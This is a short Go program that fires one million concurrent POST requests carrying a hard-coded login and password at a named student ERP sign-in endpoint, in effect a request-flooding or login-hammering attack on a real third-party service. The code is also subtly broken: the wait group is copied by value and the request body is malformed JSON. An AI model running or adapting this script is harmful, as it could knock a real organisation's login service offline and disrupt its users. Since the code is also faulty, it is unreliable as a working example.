package main

import (
	"bytes"
	"io"
	"net/http"
	"sync"
)

func main() {
	client := http.Client{}
	wait := sync.WaitGroup{}
	wait.Add(1000000)
	for i := 0; i < 1000000; i++ {
		go post(&client, wait)
	}
	wait.Wait()
}

func post(client *http.Client, w sync.WaitGroup) {
	login := `
  "login": "ID1234df4"
  "password": "123444"
  `

	req, err := http.NewRequest("POST",
		"https://erp.api.najottalim.uz/api/student/auth/sign-in",
		bytes.NewBuffer([]byte(login)))
	if err != nil {
		panic(err)
	}
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()

	_, err = io.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	// fmt.Println(string(bdy))
	w.Done()
}
